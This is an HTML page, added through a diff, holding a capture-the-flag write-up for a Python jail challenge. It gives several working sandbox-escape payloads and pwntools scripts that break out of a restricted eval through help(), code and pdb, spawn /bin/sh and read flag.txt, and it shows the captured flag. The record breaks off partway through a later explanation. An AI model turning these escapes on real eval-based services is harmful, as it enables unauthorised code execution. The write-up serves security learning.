@@ -1,0 +1,695 @@
+<!-- https://raw.githubusercontent.com/mkdocs/mkdocs/refs/heads/master/mkdocs/themes/mkdocs/base.html -->
+<!DOCTYPE html>
+<html lang="en" data-bs-theme="light">
+    <head>
+        <meta charset="utf-8">
+        <meta http-equiv="X-UA-Compatible" content="IE=edge">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        
+        
+        <link rel="canonical" href="https://jia.je/ctf-writeups/2025-09-12-fortid-ctf-2025/michael-scottfield.html">
+        <link rel="shortcut icon" href="../img/favicon.ico">
+        <title>Michael Scottfield - CTF Writeups by @jiegec</title>
+        <link href="../css/bootstrap.min.css" rel="stylesheet">
+        <link href="../css/fontawesome.min.css" rel="stylesheet">
+        <link href="../css/brands.min.css" rel="stylesheet">
+        <link href="../css/solid.min.css" rel="stylesheet">
+        <link href="../css/v4-font-face.min.css" rel="stylesheet">
+        <link href="../css/base.css" rel="stylesheet">
+        <!-- added by @jiegec begin -->
+        <link href=" https://cdn.jsdelivr.net/npm/prismjs@1.30.0/themes/prism.min.css " rel="stylesheet">
+        <!-- added by @jiegec end -->
+        <!-- added by @jiegec begin -->
+        <script src="https://cdn.jsdelivr.net/npm/prismjs@1.30.0/components/prism-core.min.js"></script>
+        <script src="https://cdn.jsdelivr.net/npm/prismjs@1.30.0/plugins/autoloader/prism-autoloader.min.js"></script>
+        <!-- added by @jiegec end -->
+
+      <!-- added by @jiegec begin -->
+      <script defer src="https://cdn.jsdelivr.net/npm/mathjax@4/tex-mml-chtml.js"></script>
+      </script>
+      
+      <script async src="https://www.googletagmanager.com/gtag/js?id=G-3109FRSVTT"></script>
+      <script>
+          window.dataLayer = window.dataLayer || [];
+          function gtag() { dataLayer.push(arguments); }
+          gtag('js', new Date());
+      
+          gtag('config', 'G-3109FRSVTT');
+      </script>
+      
+      <script src="https://analytics.jiege.pro/api/script.js" data-site-id="1" defer></script>
+      <!-- added by @jiegec end --> 
+    </head>
+
+    <body>
+        <div class="navbar fixed-top navbar-expand-lg navbar-dark bg-primary">
+            <div class="container">
+                <a class="navbar-brand" href="../index.html">CTF Writeups by @jiegec</a>
+                <!-- Expander button -->
+                <button type="button" class="navbar-toggler" data-bs-toggle="collapse" data-bs-target="#navbar-collapse" aria-controls="navbar-collapse" aria-expanded="false" aria-label="Toggle navigation">
+                    <span class="navbar-toggler-icon"></span>
+                </button>
+
+                <!-- Expanded navigation -->
+                <div id="navbar-collapse" class="navbar-collapse collapse">
+                        <!-- Main navigation -->
+                        <ul class="nav navbar-nav">
+                            <li class="nav-item">
+                                <a href="../index.html" class="nav-link">Home</a>
+                            </li>
+                            <li class="nav-item">
+                                <a href="../misc/solution.html" class="nav-link">Writeups by Solution</a>
+                            </li>
+                            <li class="nav-item">
+                                <a href="../misc/pyjail.html" class="nav-link">Pyjail</a>
+                            </li>
+                            <li class="nav-item">
+                                <a href="../puppeteer/index.html" class="nav-link">Redbud Puppeteer</a>
+                            </li>
+                        </ul>
+
+                    <ul class="nav navbar-nav ms-md-auto">
+                        <li class="nav-item">
+                            <a href="#" class="nav-link" data-bs-toggle="modal" data-bs-target="#mkdocs_search_modal">
+                                <i class="fa fa-search"></i> Search
+                            </a>
+                        </li>
+                    </ul>
+                </div>
+            </div>
+        </div>
+
+        <div class="container">
+            <div class="row">
+                    <div class="col-md-3"><div class="navbar-expand-md bs-sidebar hidden-print affix" role="complementary">
+    <div class="navbar-header">
+        <button type="button" class="navbar-toggler collapsed" data-bs-toggle="collapse" data-bs-target="#toc-collapse" title="Table of Contents">
+            <span class="fa fa-angle-down"></span>
+        </button>
+    </div>
+
+    
+    <div id="toc-collapse" class="navbar-collapse collapse card bg-body-tertiary">
+        <ul class="nav flex-column">
+            
+            <li class="nav-item" data-bs-level="1"><a href="#michael-scottfield" class="nav-link">Michael Scottfield</a>
+              <ul class="nav flex-column">
+            <li class="nav-item" data-bs-level="2"><a href="#step-1-enter-the-help-function" class="nav-link">Step 1. enter the help() function</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#step-2-load-new-module-and-execute-function-from-the-newly-module-to-achieve-rce" class="nav-link">Step 2. load new module, and execute function from the newly module to achieve RCE</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+            <li class="nav-item" data-bs-level="2"><a href="#explain-the-writeups-above" class="nav-link">Explain the writeups above</a>
+              <ul class="nav flex-column">
+              </ul>
+            </li>
+              </ul>
+            </li>
+        </ul>
+    </div>
+</div></div>
+                    <div class="col-md-9" role="main">
+
+<h1 id="michael-scottfield">Michael Scottfield</h1>
+<pre class="highlight"><code>T-Bag: "You think you’re the smartest man in the room?"
+
+Michael: "No. But I don’t need to be. I just need to be the one with the plan."
+
+Flag is in flag.txt.
+
+nc 0.cloud.chals.io 33618</code></pre>
+<p>Attachment:</p>
+<pre class="highlight"><code class="language-python">def check_pattern(user_input):
+    """
+    This function will check if numbers or strings are in user_input.
+    """
+    return '"' in user_input or '\'' in user_input or any(str(n) in user_input for n in range(10))
+
+
+while True:
+    user_input = input("&gt;&gt; ")
+
+    if len(user_input) == 0:
+        continue
+
+    if len(user_input) &gt; 500:
+        print("Too long!")
+        continue
+
+    if not __import__("re").fullmatch(r'([^()]|\(\))*', user_input):
+        print("No function calls with arguments!")
+        continue
+
+    if check_pattern(user_input):
+        print("Numbers and strings are forbbiden")
+        continue
+
+    forbidden_keywords = ['eval', 'exec', 'import', 'open']
+    forbbiden = False
+    for word in forbidden_keywords:
+        if word in user_input:
+            forbbiden = True
+
+    if forbbiden:
+        print("Forbbiden keyword")
+        continue
+
+    try:
+        output = eval(user_input, {"__builtins__": None}, {})
+        print(output)
+    except:
+        print("Error")</code></pre>
+<p>This is a python jail challenge. I did not solve it in the competition, but learnt how to solve it after the competition ends. Here are the solutions on the Discord:</p>
+<p>@hibwyli:</p>
+<pre class="highlight"><code class="language-python">[t:=True+True+True+True+True+True+True+True+True+True,f:=t*t+t+t+t+t+t,e:=True+True+True+True+True,().__class__.__base__.__subclasses__()[f+t-True]()()] 
+pdb
+sandbox
+[s:=True+True+True,t:=True+True+True+True+True+True+True+True+True+True,f:=t*t+t+t+t+t+t,e:=True+True+True+True+True,a:=().__class__.__base__.__subclasses__()[f+t-True].__doc__,().__class__.__base__.__subclasses__()[f+t-True-True].__init__.__globals__[a[t+t+t+e]+a[t+t+t+t+t+e+s]+a[t+t+t+e]].modules[a[t+t+s]+a[t+t+t+t+t+e]+a[t+True]].set_trace()]
+"".__class__.__base__.__subclasses__()[141].__init__.__globals__["__builtins__"]["__import__"]("os").system("cat flag.txt")</code></pre>
+<p>@Phisher:</p>
+<pre class="highlight"><code class="language-python">[m.help()for B in[().__class__.__base__]for L in[[].__class__.__name__]for x in B.__subclasses__()if x.__init__.__class__.__name__[False]==().__format__.__name__[True+True]for G in[x.__init__.__globals__]if L[True+True]+B.__class__.__name__[True]+L[True+True]in G for S in[G[L[True+True]+B.__class__.__name__[True]+L[True+True]]]for m in S.modules.values()if m.__name__==[].__class__.__module__][False]
+pdb
+sandbox
+[S.modules[B.__class__.__name__[True+True]+G.__class__.__name__[False]+B.__name__[True]].set_trace() for B in[().__class__.__base__] for L in[[].__class__.__name__] for x in B.__subclasses__() if x.__init__.__class__.__name__[False]==().__format__.__name__[True+True] for G in[x.__init__.__globals__] if L[True+True]+B.__class__.__name__[True]+L[True+True] in G for S in[ G[L[True+True]+B.__class__.__name__[True]+L[True+True]] ]][False]
+# enters pdb prompt</code></pre>
+<p>@(ztz:</p>
+<pre class="highlight"><code class="language-python">[y:=().__doc__,ww:=True,z:=ww+ww,t:=z+z+z+z+z+z+z+z+z+ww,zt:=t+t+t+t+t+t+t+t+z+z+z+ww,a:=().__class__.__base__.__subclasses__,w:=a()[zt]()(),a()[ww-ww-ww-ww-ww].__subclasses__()[False]().interact()]
+# enters help prompt
+
+https://github.com/mmm-team/public-writeups/blob/d592f318b5daa813b89d4b1bae323862fda911de/seccon2024/jail_1linepyjail/README.md?plain=1#L15</code></pre>
+<p>This is my first time to learn python jail escape. Here is the detailed attack sequence learned from <a href="https://github.com/mmm-team/public-writeups/blob/d592f318b5daa813b89d4b1bae323862fda911de/seccon2024/jail_1linepyjail/README.md?plain=1#L15">1linepyjail - Jail Problem writeup</a>:</p>
+<ol>
+<li>enter the help() function</li>
+<li>load new module, e.g. code or pdb, and execute function from the newly module to achieve RCE</li>
+</ol>
+<h2 id="step-1-enter-the-help-function">Step 1. enter the help() function</h2>
+<p>So the first thing is to invoke the help() function. It can be found in :</p>
+<pre class="highlight"><code class="language-python">&gt;&gt; ().__class__.__base__.__subclasses__()
+[..., &lt;class '_sitebuiltins._Helper'&gt;, ...]</code></pre>
+<p>We can find its index:</p>
+<pre class="highlight"><code class="language-python">from pwn import *
+
+p = remote("0.cloud.chals.io", 33618)
+p.recvuntil(b"&gt;&gt; ")
+p.sendline(b"().__class__.__base__.__subclasses__()")
+res = p.recvline().decode()
+print(res.split(", ").index("&lt;class '_sitebuiltins._Helper'&gt;"))</code></pre>
+<p>Output is 159. So we need to access 159 of the array. But, we cannot use digits directly. Instead, we use <code>True</code> as if we have integers:</p>
+<pre class="highlight"><code class="language-python">&gt;&gt; [A:=True+True+True+True+True+True+True+True+True+True,B:=A*A,C:=A+A+A+A+A,D:=A+B+C-True]
+# A=10, B=10*10=100, C=10*5=50, D=10+100+50-1=159
+[10, 100, 50, 159]</code></pre>
+<p>Now that <code>D</code> is <code>159</code>, we can access the <code>&lt;class '_sitebuiltins.Helper'&gt;</code> and call it twice to invoke <code>help()</code>:</p>
+<pre class="highlight"><code class="language-python">&gt;&gt; [A:=True+True+True+True+True+True+True+True+True+True,B:=A*A,C:=A+A+A+A+A,D:=A+B+C-True,().__class__.__base__.__subclasses__()[D]]
+[10, 100, 50, 159, &lt;class '_sitebuiltins._Helper'&gt;]
+&gt;&gt; [A:=True+True+True+True+True+True+True+True+True+True,B:=A*A,C:=A+A+A+A+A,D:=A+B+C-True,().__class__.__base__.__subclasses__()[D]()]
+[10, 100, 50, 159, Type help() for interactive help, or help(object) for help about object.]
+&gt;&gt; [A:=True+True+True+True+True+True+True+True+True+True,B:=A*A,C:=A+A+A+A+A,D:=A+B+C-True,().__class__.__base__.__subclasses__()[D]()()]
+&gt;&gt; [A:=True+True+True+True+True+True+True+True+True+True,B:=A*A,C:=A+A+A+A+A,D:=A+B+C-True,().__class__.__base__.__subclasses__()[D]()()]
+Welcome to Python 3.12's help utility! If this is your first time using
+Python, you should definitely check out the tutorial at
+https://docs.python.org/3.12/tutorial/.
+
+Enter the name of any module, keyword, or topic to get help on writing
+Python programs and using Python modules.  To get a list of available
+modules, keywords, symbols, or topics, enter "modules", "keywords",
+"symbols", or "topics".
+
+Each module also comes with a one-line summary of what it does; to list
+the modules whose name or summary contain a given string such as "spam",
+enter "modules spam".
+
+To quit this help utility and return to the interpreter,
+enter "q" or "quit".
+
+help&gt; </code></pre>
+<p>So the first step is done. Actually, if pager is available (e.g. locally), we can get shell using <code>!/bin/sh</code> in pager:</p>
+<pre class="highlight"><code class="language-shell">$ python3
+Python 3.13.5 (main, Jun 25 2025, 18:55:22) [GCC 14.2.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+Ctrl click to launch VS Code Native REPL
+&gt;&gt;&gt; help()
+Welcome to Python 3.13's help utility! If this is your first time using
+Python, you should definitely check out the tutorial at
+https://docs.python.org/3.13/tutorial/.
+
+Enter the name of any module, keyword, or topic to get help on writing
+Python programs and using Python modules.  To get a list of available
+modules, keywords, symbols, or topics, enter "modules", "keywords",
+"symbols", or "topics".
+
+Each module also comes with a one-line summary of what it does; to list
+the modules whose name or summary contain a given string such as "spam",
+enter "modules spam".
+
+To quit this help utility and return to the interpreter,
+enter "q", "quit" or "exit".
+
+help&gt; subprocess
+# in the pager, input !/bin/sh to get shell
+$ </code></pre>
+<p>However, it does not work remotely. Therefore, we need more steps.</p>
+<h2 id="step-2-load-new-module-and-execute-function-from-the-newly-module-to-achieve-rce">Step 2. load new module, and execute function from the newly module to achieve RCE</h2>
+<p>There are different approachs to achieve RCE:</p>
+<ol>
+<li>code.InteractiveConsole().interact()</li>
+<li>pdb.set_trace()</li>
+</ol>
+<h3 id="use-code-module">Use code module</h3>
+<p>First, let's try the first option. After launching <code>help()</code>, enter <code>code</code> to load it and enter <code>quit</code> to return to the shell:</p>
+<pre class="highlight"><code class="language-python">from pwn import *
+
+context(log_level = "debug")
+
+p = remote("0.cloud.chals.io", 33618)
+p.recvuntil(b"&gt;&gt; ")
+p.sendline(b"[A:=True+True+True+True+True+True+True+True+True+True,B:=A*A,C:=A+A+A+A+A,D:=A+B+C-True,().__class__.__base__.__subclasses__()[D]()()]")
+p.recvuntil(b"help&gt; ")
+p.sendline(b"code")
+p.sendline(b"quit")
+p.interactive()</code></pre>
+<p>Now the next thing is to execute <code>code.InteractiveConsole().interact()</code>. Since we don't have builtins, we need to use <code>sys.modules["code"]</code> to locate <code>code</code> module. But where is <code>sys</code>? we can find it in <code>_sitebuiltins._Printer</code>. We can find its index just as we did for <code>_sitebuiltins._Helper</code>:</p>
+<pre class="highlight"><code class="language-python">from pwn import *
+
+context(log_level = "debug")
+
+p = remote("0.cloud.chals.io", 33618)
+p.recvuntil(b"&gt;&gt; ")
+p.sendline(b"().__class__.__base__.__subclasses__()")
+res = p.recvline().decode()
+print("Helper", res.split(", ").index("&lt;class '_sitebuiltins._Helper'&gt;"))
+print("Printer", res.split(", ").index("&lt;class '_sitebuiltins._Printer'&gt;"))</code></pre>
+<p>It is 158, so we can locate it in a similar way:</p>
+<pre class="highlight"><code class="language-python">&gt;&gt; [A:=True+True+True+True+True+True+True+True+True+True,B:=A*A,C:=A+A+A+A+A,D:=A+B+C-True,().__class__.__base__.__subclasses__()[D-True]]
+[10, 100, 50, 159, &lt;class '_sitebuiltins._Printer'&gt;]</code></pre>
+<p>We can find <code>sys</code> in its <code>__init__.__globals__</code>:</p>
+<pre class="highlight"><code class="language-python">&gt;&gt; [A:=True+True+True+True+True+True+True+True+True+True,B:=A*A,C:=A+A+A+A+A,D:=A+B+C-True,().__class__.__base__.__subclasses__()[D-True].__init__.__globals__]
+[..., {..., 'sys': &lt;module 'sys' (built-in)&gt;, ...}]</code></pre>
+<p>Then, we need to find two strings for <code>sys.modules["code"]</code>: <code>"sys"</code> and <code>"code"</code>. Remember we have access to <code>__doc__</code>, and we can use arbitrary characters in there:</p>
+<pre class="highlight"><code class="language-python">&gt;&gt; [A:=True+True+True+True+True+True+True+True+True+True,B:=A*A,C:=A+A+A+A+A,D:=A+B+C-True,().__class__.__base__.__subclasses__()[D].__doc__]
+[10, 100, 50, 159, "Define the builtin 'help'.\n\n    This is a wrapper around pydoc.help that provides a helpful message\n    when 'help' is typed at the Python interactive prompt.\n\n    Calling help() at the Python prompt starts an interactive help session.\n    Calling help(thing) prints help for the python object 'thing'.\n    "]
+&gt;&gt; [A:=True+True+True+True+True+True+True+True+True+True,B:=A*A,C:=A+A+A+A+A,D:=A+B+C-True,S:=().__class__.__base__.__subclasses__()[D].__doc__,S[A+A+A+C]+S[C+A-True-True]+S[A+A+A+C],S[C+A+True]+S[C+True+True]+S[C+True+True+True+True+True]+S[True]]
+# the indices can be found locally via __doc__.index(ch)
+[10, 100, 50, 159, "Define the builtin 'help'.\n\n    This is a wrapper around pydoc.help that provides a helpful message\n    when 'help' is typed at the Python interactive prompt.\n\n    Calling help() at the Python prompt starts an interactive help session.\n    Calling help(thing) prints help for the python object 'thing'.\n    ", 'sys', 'code']</code></pre>
+<p>Then we can call <code>code.InteractiveConsole().interact()</code>:</p>
+<pre class="highlight"><code class="language-python">&gt;&gt; [A:=True+True+True+True+True+True+True+True+True+True,B:=A*A,C:=A+A+A+A+A,D:=A+B+C-True,S:=().__class__.__base__.__subclasses__()[D].__doc__,().__class__.__base__.__subclasses__()[D-True].__init__.__globals__[S[A+A+A+C]+S[C+A-True-True]+S[A+A+A+C]].modules[S[C+A+True]+S[C+True+True]+S[C+True+True+True+True+True]+S[True]]]
+[10, 100, 50, 159, "Define the builtin 'help'.\n\n    This is a wrapper around pydoc.help that provides a helpful message\n    when 'help' is typed at the Python interactive prompt.\n\n    Calling help() at the Python prompt starts an interactive help session.\n    Calling help(thing) prints help for the python object 'thing'.\n    ", &lt;module 'code' from '/usr/local/lib/python3.12/code.py'&gt;]</code></pre>
+<p>Remember to load <code>code</code> module in the previous step, otherwise it will fail. Eventually, we get an interactive shell to do anything:</p>
+<pre class="highlight"><code class="language-python">&gt;&gt; [A:=True+True+True+True+True+True+True+True+True+True,B:=A*A,C:=A+A+A+A+A,D:=A+B+C-True,S:=().__class__.__base__.__subclasses__()[D].__doc__,().__class__.__base__.__subclasses__()[D-True].__init__.__globals__[S[A+A+A+C]+S[C+A-True-True]+S[A+A+A+C]].modules[S[C+A+True]+S[C+True+True]+S[C+True+True+True+True+True]+S[True]].InteractiveConsole().interact()]
+# this is the interactive console
+&gt;&gt;&gt;</code></pre>
+<p>Everything required to send:</p>
+<pre class="highlight"><code class="language-python">[A:=True+True+True+True+True+True+True+True+True+True,B:=A*A,C:=A+A+A+A+A,D:=A+B+C-True,().__class__.__base__.__subclasses__()[D]()()]
+code
+quit
+[A:=True+True+True+True+True+True+True+True+True+True,B:=A*A,C:=A+A+A+A+A,D:=A+B+C-True,S:=().__class__.__base__.__subclasses__()[D].__doc__,().__class__.__base__.__subclasses__()[D-True].__init__.__globals__[S[A+A+A+C]+S[C+A-True-True]+S[A+A+A+C]].modules[S[C+A+True]+S[C+True+True]+S[C+True+True+True+True+True]+S[True]].InteractiveConsole().interact()]
+import os
+os.system("cat flag.txt")</code></pre>
+<p>Attack script:</p>
+<pre class="highlight"><code class="language-python">from pwn import *
+
+context(log_level = "debug")
+
+p = remote("0.cloud.chals.io", 33618)
+p.recvuntil(b"&gt;&gt; ")
+p.sendline(b"().__class__.__base__.__subclasses__()")
+res = p.recvline().decode()
+print("Helper", res.split(", ").index("&lt;class '_sitebuiltins._Helper'&gt;"))
+print("Printer", res.split(", ").index("&lt;class '_sitebuiltins._Printer'&gt;"))
+
+p.recvuntil(b"&gt;&gt; ")
+p.sendline(b"[A:=True+True+True+True+True+True+True+True+True+True,B:=A*A,C:=A+A+A+A+A,D:=A+B+C-True,().__class__.__base__.__subclasses__()[D]()()]")
+p.recvuntil(b"help&gt; ")
+p.sendline(b"code")
+p.sendline(b"quit")
+
+p.recvuntil(b"&gt;&gt; ")
+p.sendline(b"[A:=True+True+True+True+True+True+True+True+True+True,B:=A*A,C:=A+A+A+A+A,D:=A+B+C-True,S:=().__class__.__base__.__subclasses__()[D].__doc__,().__class__.__base__.__subclasses__()[D-True].__init__.__globals__[S[A+A+A+C]+S[C+A-True-True]+S[A+A+A+C]].modules[S[C+A+True]+S[C+True+True]+S[C+True+True+True+True+True]+S[True]].InteractiveConsole().interact()]")
+p.recvuntil(b"&gt;&gt;&gt; ")
+p.sendline(b"import os")
+p.sendline(b"os.system(\"cat flag.txt\")")
+p.interactive()</code></pre>
+<p>Fully automated attack script to generate the indices:</p>
+<pre class="highlight"><code class="language-python">from pwn import *
+
+context(log_level="debug")
+
+p = remote("0.cloud.chals.io", 33618)
+p.recvuntil(b"&gt;&gt; ")
+p.sendline(b"().__class__.__base__.__subclasses__()")
+res = p.recvline().decode()
+
+helper_index = res.split(", ").index("&lt;class '_sitebuiltins._Helper'&gt;")
+printer_index = res.split(", ").index("&lt;class '_sitebuiltins._Printer'&gt;")
+print("Helper", helper_index)
+print("Printer", printer_index)
+
+# A is 10, B is 100
+
+
+def get_index(index):
+    if index % 10 &lt;= 5:
+        parts = (
+            ["True"] * (index % 10)
+            + ["A"] * (index // 10 % 10)
+            + ["B"] * (index // 100 % 10)
+        )
+        return "+".join(parts)
+    else:
+        parts = ["A"] * (index // 10 % 10 + 1) + ["B"] * (
+            index // 100 % 10
+        )
+        return "+".join(parts) + "-" + "-".join(["True"] * (10 - index % 10))
+
+
+# H for index of helper
+helper = get_index(helper_index)
+print(helper)
+
+p.recvuntil(b"&gt;&gt; ")
+p.sendline(
+    b"[A:=True+True+True+True+True+True+True+True+True+True,B:=A*A,H:="
+    + helper.encode()
+    + b",().__class__.__base__.__subclasses__()[H]()()]"
+)
+p.recvuntil(b"help&gt; ")
+p.sendline(b"code")
+p.recvuntil(b"help&gt; ")
+p.sendline(b"quit")
+
+# find help text of helper
+p.recvuntil(b"&gt;&gt; ")
+p.sendline(
+    b"[A:=True+True+True+True+True+True+True+True+True+True,B:=A*A,H:="
+    + helper.encode()
+    + b",S:=().__class__.__base__.__subclasses__()[H].__doc__]"
+)
+help_text = eval(p.recvline().decode())[-1]
+
+# P for index of printer
+
+printer = get_index(printer_index)
+print(printer)
+
+
+# synthesize "sys" and "code"
+def synthesize(text):
+    res = []
+    for ch in text:
+        index = help_text.index(ch)
+        res.append("S[" + get_index(index) + "]")
+    return "+".join(res)
+
+
+p.recvuntil(b"&gt;&gt; ")
+p.sendline(
+    b"[A:=True+True+True+True+True+True+True+True+True+True,B:=A*A,H:="
+    + helper.encode()
+    + b",P:="
+    + printer.encode()
+    + b",S:=().__class__.__base__.__subclasses__()[H].__doc__,().__class__.__base__.__subclasses__()[P].__init__.__globals__["
+    + synthesize("sys").encode()
+    + b"].modules["
+    + synthesize("code").encode()
+    + b"].InteractiveConsole().interact()]"
+)
+p.recvuntil(b"&gt;&gt;&gt; ")
+p.sendline(b"import os")
+p.sendline(b'os.system("/bin/sh")')
+p.interactive()</code></pre>
+<p>It works locally with Python 3.8/3.10/3.11/3.12/3.13 since the indices are probed dynamically. If we can't probe the Python version remotely, we can try different indices from common Python versions. If the lenght limit is smaller, we can reduce the length further by finding shorter way to compute the integers, e.g. defining <code>T:=True</code>.</p>
+<h3 id="use-pdb-module">Use pdb module</h3>
+<p>The attack using pdb is similar: we only need to call <code>pdb.set_trace()</code>:</p>
+<pre class="highlight"><code class="language-python">from pwn import *
+
+context(log_level="debug")
+
+p = remote("0.cloud.chals.io", 33618)
+p.recvuntil(b"&gt;&gt; ")
+p.sendline(b"().__class__.__base__.__subclasses__()")
+res = p.recvline().decode()
+
+helper_index = res.split(", ").index("&lt;class '_sitebuiltins._Helper'&gt;")
+printer_index = res.split(", ").index("&lt;class '_sitebuiltins._Printer'&gt;")
+print("Helper", helper_index)
+print("Printer", printer_index)
+
+# A is 10, B is 100
+
+
+def get_index(index):
+    if index % 10 &lt;= 5:
+        parts = (
+            ["True"] * (index % 10)
+            + ["A"] * (index // 10 % 10)
+            + ["B"] * (index // 100 % 10)
+        )
+        return "+".join(parts)
+    else:
+        parts = ["A"] * (index // 10 % 10 + 1) + ["B"] * (index // 100 % 10)
+        return "+".join(parts) + "-" + "-".join(["True"] * (10 - index % 10))
+
+
+# H for index of helper
+helper = get_index(helper_index)
+print(helper)
+
+p.recvuntil(b"&gt;&gt; ")
+p.sendline(
+    b"[A:=True+True+True+True+True+True+True+True+True+True,B:=A*A,H:="
+    + helper.encode()
+    + b",().__class__.__base__.__subclasses__()[H]()()]"
+)
+p.recvuntil(b"help&gt; ")
+p.sendline(b"pdb")
+p.recvuntil(b"help&gt; ")
+p.sendline(b"quit")
+
+# find help text of helper
+p.recvuntil(b"&gt;&gt; ")
+p.sendline(
+    b"[A:=True+True+True+True+True+True+True+True+True+True,B:=A*A,H:="
+    + helper.encode()
+    + b",S:=().__class__.__base__.__subclasses__()[H].__doc__]"
+)
+help_text = eval(p.recvline().decode())[-1]
+
+# P for index of printer
+
+printer = get_index(printer_index)
+print(printer)
+
+
+# synthesize "sys" and "pdb"
+def synthesize(text):
+    res = []
+    for ch in text:
+        index = help_text.index(ch)
+        res.append("S[" + get_index(index) + "]")
+    return "+".join(res)
+
+
+p.recvuntil(b"&gt;&gt; ")
+p.sendline(
+    b"[A:=True+True+True+True+True+True+True+True+True+True,B:=A*A,H:="
+    + helper.encode()
+    + b",P:="
+    + printer.encode()
+    + b",S:=().__class__.__base__.__subclasses__()[H].__doc__,().__class__.__base__.__subclasses__()[P].__init__.__globals__["
+    + synthesize("sys").encode()
+    + b"].modules["
+    + synthesize("pdb").encode()
+    + b"].set_trace()]"
+)
+p.recvuntil(b"(Pdb) ")
+p.sendline(
+    (
+        '().__class__.__base__.__subclasses__()['
+        + str(printer_index)
+        + '].__init__.__globals__["sys"].modules["os"].system("/bin/sh")'
+    ).encode()
+)
+p.interactive()</code></pre>
+<p>Adapt the script above to load <code>pdb</code> module instead. Then, we can execute what we want freely.</p>
+<h2 id="explain-the-writeups-above">Explain the writeups above</h2>
+<p>Now we can explain the writeups by folks on Discord:</p>
+<p>@hibwyli:</p>
+<pre class="highlight"><code class="language-python"># step 1, launch help(), load pdb module and return to pdb
+# t=10, f=150, e=5, f+t-True=159
+&gt;&gt; [t:=True+True+True+True+True+True+True+True+True+True,f:=t*t+t+t+t+t+t,e:=True+True+True+True+True,().__class__.__base__.__subclasses__()[f+t-True]] 
+[10, 150, 5, &lt;class '_sitebuiltins._Helper'&gt;]
+&gt;&gt; [t:=True+True+True+True+True+True+True+True+True+True,f:=t*t+t+t+t+t+t,e:=True+True+True+True+True,().__class__.__base__.__subclasses__()[f+t-True]()()] 
+help&gt; pdb
+help&gt; sandbox
+# step 2, run pdb.set_trace()
+&gt;&gt; [s:=True+True+True,t:=True+True+True+True+True+True+True+True+True+True,f:=t*t+t+t+t+t+t,e:=True+True+True+True+True,a:=().__class__.__base__.__subclasses__()[f+t-True].__doc__,().__class__.__base__.__subclasses__()[f+t-True-True].__init__.__globals__[a[t+t+t+e]+a[t+t+t+t+t+e+s]+a[t+t+t+e]].modules[a[t+t+s]+a[t+t+t+t+t+e]+a[t+True]]]
+[3, 10, 150, 5, "Define the builtin 'help'.\n\n    This is a wrapper around pydoc.help that provides a helpful message\n    when 'help' is typed at the Python interactive prompt.\n\n    Calling help() at the Python prompt starts an interactive help session.\n    Calling help(thing) prints help for the python object 'thing'.\n    ", &lt;module 'pdb' from '/usr/local/lib/python3.12/pdb.py'&gt;]
+&gt;&gt; [s:=True+True+True,t:=True+True+True+True+True+True+True+True+True+True,f:=t*t+t+t+t+t+t,e:=True+True+True+True+True,a:=().__class__.__base__.__subclasses__()[f+t-True].__doc__,().__class__.__base__.__subclasses__()[f+t-True-True].__init__.__globals__[a[t+t+t+e]+a[t+t+t+t+t+e+s]+a[t+t+t+e]].modules[a[t+t+s]+a[t+t+t+t+t+e]+a[t+True]].set_trace()]
+# read flag in pdb
+(Pdb) "".__class__.__base__.__subclasses__()[141].__init__.__globals__["__builtins__"]["__import__"]("os").system("cat flag.txt")
+FortID{Wh3n_7h3_517u4710n_l00k5_1mp0551bl3,_y0u_d0n7_g1v3_up}
+0
+(Pdb)</code></pre>
+<p>@Phisher:</p>
+<pre class="highlight"><code class="language-python"># step 1. run help() and load pdb
+&gt;&gt; [B for B in[().__class__.__base__]]
+[&lt;class 'object'&gt;]
+&gt;&gt; [L for B in[().__class__.__base__]for L in[[].__class__.__name__]]
+['list']
+# construct "sys"
+&gt;&gt; ().__format__.__name__[True+True]
+f
+&gt;&gt; [B.__class__.__name__ for B in[().__class__.__base__]]
+['type']
+&gt;&gt; [L[True+True]+B.__class__.__name__[True]+L[True+True] for B in[().__class__.__base__]for L in[[].__class__.__name__]]
+# 'list'[2]+'type'[1]+'list'[2] == 'sys'
+['sys']
+# filter by module name to find sys
+&gt;&gt; [S for B in[().__class__.__base__]for L in[[].__class__.__name__]for x in B.__subclasses__()if x.__init__.__class__.__name__[False]==().__format__.__name__[True+True]for G in[x.__init__.__globals__]if L[True+True]+B.__class__.__name__[True]+L[True+True]in G for S in[G[L[True+True]+B.__class__.__name__[True]+L[True+True]]]]
+[&lt;module 'sys' (built-in)&gt;, &lt;module 'sys' (built-in)&gt;, &lt;module 'sys' (built-in)&gt;, &lt;module 'sys' (built-in)&gt;, &lt;module 'sys' (built-in)&gt;, &lt;module 'sys' (built-in)&gt;, &lt;module 'sys' (built-in)&gt;, &lt;module 'sys' (built-in)&gt;, &lt;module 'sys' (built-in)&gt;, &lt;module 'sys' (built-in)&gt;, &lt;module 'sys' (built-in)&gt;, &lt;module 'sys' (built-in)&gt;, &lt;module 'sys' (built-in)&gt;, &lt;module 'sys' (built-in)&gt;, &lt;module 'sys' (built-in)&gt;, &lt;module 'sys' (built-in)&gt;, &lt;module 'sys' (built-in)&gt;, &lt;module 'sys' (built-in)&gt;, &lt;module 'sys' (built-in)&gt;, &lt;module 'sys' (built-in)&gt;, &lt;module 'sys' (built-in)&gt;, &lt;module 'sys' (built-in)&gt;, &lt;module 'sys' (built-in)&gt;]
+# find builtins module
+&gt;&gt; [].__class__.__module__
+builtins
+&gt;&gt; [m for B in[().__class__.__base__]for L in[[].__class__.__name__]for x in B.__subclasses__()if x.__init__.__class__.__name__[False]==().__format__.__name__[True+True]for G in[x.__init__.__globals__]if L[True+True]+B.__class__.__name__[True]+L[True+True]in G for S in[G[L[True+True]+B.__class__.__name__[True]+L[True+True]]]for m in S.modules.values()if m.__name__==[].__class__.__module__]
